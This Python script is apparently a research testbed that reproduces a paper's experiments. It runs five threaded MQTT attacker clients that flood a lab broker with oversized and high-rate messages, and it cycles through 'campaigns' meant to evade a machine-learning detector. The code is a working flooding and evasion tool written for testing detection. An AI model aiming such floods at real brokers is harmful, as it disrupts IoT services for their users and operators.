# attacker_publisher.py
# Runs on RPi 4 #2.
# Simulates 5 attacker clients (IDs 10-14).
# Each attacker uses one of the 3 attack types from the paper (Section 4.2).
#
# Every client runs in its own thread with its own MQTT connection and its
# own send loop, so the time delta the broker measures for a client is that
# client's real sending interval (Sec. 7: "each running as a separate client
# process"). Previously all five IDs were sent round-robin from one loop, so
# each ID reached the broker only once per full cycle (~40 ms). That hid the
# QoS 0 fast-flooding client (12) behind the 30 ms θ2avg threshold.
#
# Usage:
#   pip3 install paho-mqtt --break-system-packages
#   python3 attacker_publisher.py --broker 192.168.1.100
#
# Attack types:
#   1. Basic CONNECT flooding  — large payload + high rate
#   2. Fast flooding (QoS 0)   — high rate, low time delta
#   3. Heavy flooding (QoS 1)  — large payload + high rate

import paho.mqtt.client as mqtt
import time
import random
import json
import argparse
import socket
import threading

# Configuration
ATTACK_CLIENT_IDS = list(range(10, 15))   # clients 10-14 are attackers

# Attack parameters — all designed to violate paper thresholds
# θ1max=650B, θ2min=5ms

# Attack 1: Basic CONNECT flooding
# L > θ1max, tδ < θ2min
CONNECT_FLOOD_PAYLOAD = (660, 900)   # bytes — above θ1max (650B)
CONNECT_FLOOD_SLEEP   = (1, 3)       # ms — below θ2min (5ms)

# Attack 2: Fast flooding (QoS 0)
# tδ < θ2avg (30ms) — small payload but very fast
FAST_FLOOD_PAYLOAD    = (4, 8)       # bytes — small payload
FAST_FLOOD_SLEEP      = (1, 4)       # ms — well below θ2avg (30ms)

# Attack 3: Heavy flooding (QoS 1)
# L > θ1max, tδ < θ2min
HEAVY_FLOOD_PAYLOAD   = (660, 1000)  # bytes — above θ1max
HEAVY_FLOOD_SLEEP     = (2, 4)       # ms — below θ2min

# Each attacker client uses a fixed attack type
ATTACK_TYPE_MAP = {
    10: 'connect',   # connect flooding
    11: 'connect',
    12: 'qos0',      # fast flooding
    13: 'qos1',      # heavy flooding
    14: 'qos1'
}

BASE_SEED = 2

# Evolving attack campaigns (concept drift, Sec. 6.3.2)
# The attackers keep changing tactics so that traffic is "largely unseen by
# the ML model" until the broker retrains it. Every CAMPAIGN_EPOCHS epochs a
# new campaign starts; during a campaign each attacker sends a growing share
# of evasive messages (SHARE_START → SHARE_END along an S-curve). Every
# evasive message is still declined by Eq. 5 / Eq. 6, so the attackers'
# returns stay 0; only the RF state is fooled. Campaigns alternate between:
#   A: compact small-payload flood (QoS 0, 34-B JSON, tδ < θ2avg) — looks
#      benign to a model that separates the classes by message length
#   B: low-rate heavy payload (QoS 1, L > θ1max, slow) — looks benign to a
#      model that separates the classes by time delta
# One epoch on the broker is 10 episodes × 2 s = 20 s, so the campaign clock
# lines up with the broker's 15-epoch retraining when both are started
# together.
EPOCH_SEC       = 20.0
CAMPAIGN_EPOCHS = 15
SHARE_START     = 0.15
SHARE_END       = 0.75

EVASIVE_A_SLEEP   = (1, 3)       # ms — still a flood, well below θ2avg (30 ms)
EVASIVE_B_PAYLOAD = (660, 760)   # bytes — above θ1max (650 B)
EVASIVE_B_SLEEP   = (65, 110)    # ms — slow, like benign clients


class CampaignClock:
    """Shared by all attacker threads: which campaign, and how far into it."""

    def __init__(self, epoch_sec=EPOCH_SEC, campaign_epochs=CAMPAIGN_EPOCHS,
                 enabled=True):
        self.start           = time.monotonic()
        self.epoch_sec       = epoch_sec
        self.campaign_epochs = campaign_epochs
        self.enabled         = enabled

    def state(self):
        """Return (campaign index, evasive share) for the current moment."""
        epochs = (time.monotonic() - self.start) / self.epoch_sec
        k      = int(epochs // self.campaign_epochs)
        phase  = (epochs % self.campaign_epochs) / self.campaign_epochs
        smooth = 3 * phase ** 2 - 2 * phase ** 3
        return k, SHARE_START + (SHARE_END - SHARE_START) * smooth


def create_mqtt_client(client_id):
    """
    Use callback API v2 when available to avoid deprecation warnings,
    while staying compatible with older paho-mqtt releases.
    """
    try:
        return mqtt.Client(
            client_id=client_id,
            callback_api_version=mqtt.CallbackAPIVersion.VERSION2
        )
    except (AttributeError, TypeError):
        return mqtt.Client(client_id=client_id)


def make_payload(cid, target_bytes, is_attack=1, compact=False):
    """
    Build a JSON payload whose total encoded length is ~target_bytes.
    compact=True drops the spaces (34 B for an empty payload), which an
    evasive attacker uses to look smaller than benign clients (38 B).
    """
    seps    = (',', ':') if compact else (', ', ': ')
    base    = json.dumps({"cid": cid, "is_attack": is_attack, "data": ""},
                         separators=seps)
    padding = max(0, target_bytes - len(base.encode()))
    return json.dumps({
        "cid":       cid,
        "is_attack": is_attack,
        "data":      "X" * padding
    }, separators=seps).encode()


def next_message(attack_type, rng):
    """Return (payload_len, sleep_seconds) for one message of this attack type."""
    if attack_type == 'connect':
        # Attack 1: CONNECT flooding
        plen       = rng.randint(*CONNECT_FLOOD_PAYLOAD)
        base_sleep = rng.randint(*CONNECT_FLOOD_SLEEP)
        sleep      = (base_sleep + abs(rng.gauss(2, 8))) / 1000.0
    elif attack_type == 'qos0':
        # Attack 2: Fast flooding
        plen       = rng.randint(*FAST_FLOOD_PAYLOAD)
        base_sleep = rng.randint(*FAST_FLOOD_SLEEP)
        sleep      = (base_sleep + abs(rng.gauss(2, 5))) / 1000.0
    else:
        # Attack 3: Heavy flooding (qos1)
        plen       = rng.randint(*HEAVY_FLOOD_PAYLOAD)
        base_sleep = rng.randint(*HEAVY_FLOOD_SLEEP)
        sleep      = (base_sleep + abs(rng.gauss(2, 8))) / 1000.0
    return plen, sleep


def next_evasive_message(campaign, rng):
    """Return (msg_type, payload_len, gap_seconds, compact) for an evasive message."""
    if campaign % 2 == 0:
        # A: compact small-payload flood (QoS 0) — Eq. 6 declines tδ < θ2avg
        # Narrow jitter keeps a margin below θ2avg for OS scheduling delays
        gap = (rng.randint(*EVASIVE_A_SLEEP) + abs(rng.gauss(1, 3))) / 1000.0
        return 'qos0', 0, gap, True
    # B: low-rate heavy payload (QoS 1) — Eq. 5 declines L > θ1max
    plen = rng.randint(*EVASIVE_B_PAYLOAD)
    gap  = (rng.randint(*EVASIVE_B_SLEEP) + abs(rng.gauss(5, 15))) / 1000.0
    return 'qos1', plen, gap, False


class AttackerClient(threading.Thread):
    """One attacker client: its own MQTT connection and its own send loop."""

    def __init__(self, cid, broker_ip, broker_port, stop_event, verbose, clock):
        super().__init__(daemon=True, name=f"attacker_c{cid}")
        self.cid         = cid
        self.attack_type = ATTACK_TYPE_MAP[cid]
        self.broker_ip   = broker_ip
        self.broker_port = broker_port
        self.stop_event  = stop_event
        self.verbose     = verbose
        self.clock       = clock
        self.rng         = random.Random(BASE_SEED * 100 + cid)
        self.client      = create_mqtt_client(f"attacker_c{cid}_rpi4_2")

    def run(self):
        try:
            self.client.connect(self.broker_ip, self.broker_port, keepalive=60)
        except ConnectionRefusedError:
            print(f"[Attacker] c{self.cid} connection refused by "
                  f"{self.broker_ip}:{self.broker_port}")
            return
        except socket.gaierror as e:
            print(f"[Attacker] c{self.cid} invalid broker address "
                  f"'{self.broker_ip}': {e}")
            return
        except OSError as e:
            print(f"[Attacker] c{self.cid} could not connect to "
                  f"{self.broker_ip}:{self.broker_port} ({e})")
            return

        self.client.loop_start()
        # Single write (text + newline) so lines from different threads don't merge
        print(f"[Attacker] c{self.cid:2d} connected | attack={self.attack_type}\n", end="")

        try:
            while not self.stop_event.is_set():
                campaign, share = self.clock.state()
                if self.clock.enabled and self.rng.random() < share:
                    msg_t, plen, gap, compact = next_evasive_message(campaign, self.rng)
                else:
                    msg_t = self.attack_type
                    plen, gap = next_message(msg_t, self.rng)
                    compact = False

                # Wait first, then send: the broker's time delta for this
                # message is the gap that belongs to this message's tactic.
                if self.stop_event.wait(gap):
                    break

                payload = make_payload(self.cid, plen, is_attack=1, compact=compact)
                topic   = f"mqttsec/c{self.cid}/{msg_t}"
                qos     = 0 if msg_t == 'qos0' else 1
                try:
                    result = self.client.publish(topic, payload, qos=qos)
                    if result.rc != mqtt.MQTT_ERR_SUCCESS:
                        print(f"[Attacker] c{self.cid} publish failed: {result.rc}")
                    elif self.verbose:
                        print(f"[Attacker] c{self.cid:2d} | {msg_t:8s} | "
                              f"{len(payload):5d}B | gap={gap*1000:.0f}ms")
                except Exception as e:
                    print(f"[Attacker] c{self.cid} error: {e}")
        finally:
            self.client.loop_stop()
            self.client.disconnect()


def run_attacker_publisher(broker_ip, broker_port=1883, verbose=False,
                           campaigns=True, epoch_sec=EPOCH_SEC,
                           campaign_epochs=CAMPAIGN_EPOCHS):
    stop_event = threading.Event()
    clock      = CampaignClock(epoch_sec, campaign_epochs, enabled=campaigns)
    clients = [AttackerClient(cid, broker_ip, broker_port, stop_event, verbose, clock)
               for cid in ATTACK_CLIENT_IDS]

    print(f"[Attacker] Starting attack clients {ATTACK_CLIENT_IDS} "
          f"(one connection and send loop per client)")
    print(f"[Attacker] Attack types: {ATTACK_TYPE_MAP}")
    if campaigns:
        print(f"[Attacker] Evolving campaigns: new tactic every {campaign_epochs} "
              f"epochs ({campaign_epochs * epoch_sec:.0f} s). Start the broker now.")
    for c in clients:
        c.start()

    try:
        while any(c.is_alive() for c in clients):
            time.sleep(0.5)
    except KeyboardInterrupt:
        print("\n[Attacker] Stopping...")
    finally:
        stop_event.set()
        for c in clients:
            c.join(timeout=2.0)
        print("[Attacker] Stopped.")


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="Attacker MQTT Publisher")
    parser.add_argument('--broker', default='192.168.1.100',
                        help='Broker IP (RPi 5). Default: 192.168.1.100')
    parser.add_argument('--port',   default=1883, type=int,
                        help='Broker port. Default: 1883')
    parser.add_argument('--verbose', action='store_true',
                        help='Print every published message')
    parser.add_argument('--no-campaigns', action='store_true',
                        help='Disable evolving attack campaigns (fixed tactics only)')
    parser.add_argument('--epoch-sec', default=EPOCH_SEC, type=float,
                        help='Length of one broker epoch in seconds. Default: 20')
    parser.add_argument('--campaign-epochs', default=CAMPAIGN_EPOCHS, type=int,
                        help='Epochs per campaign (match the broker --retrain). Default: 15')
    args = parser.parse_args()

    run_attacker_publisher(args.broker, args.port, args.verbose,
                           campaigns=not args.no_campaigns,
                           epoch_sec=args.epoch_sec,
                           campaign_epochs=args.campaign_epochs)
